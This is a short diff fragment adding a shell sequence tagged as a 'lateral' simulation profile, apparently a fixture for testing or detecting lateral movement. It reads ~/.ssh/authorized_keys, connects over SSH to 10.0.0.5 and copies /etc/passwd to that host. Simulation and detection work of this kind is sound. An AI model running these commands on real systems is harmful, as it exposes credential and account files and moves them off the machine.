@@ -1,0 +1,6 @@
+echo SIM_PROFILE=lateral
+ls -la ~
+cat ~/.ssh/authorized_keys
+ssh user@10.0.0.5
+scp /etc/passwd user@10.0.0.5:/tmp/
+EOF
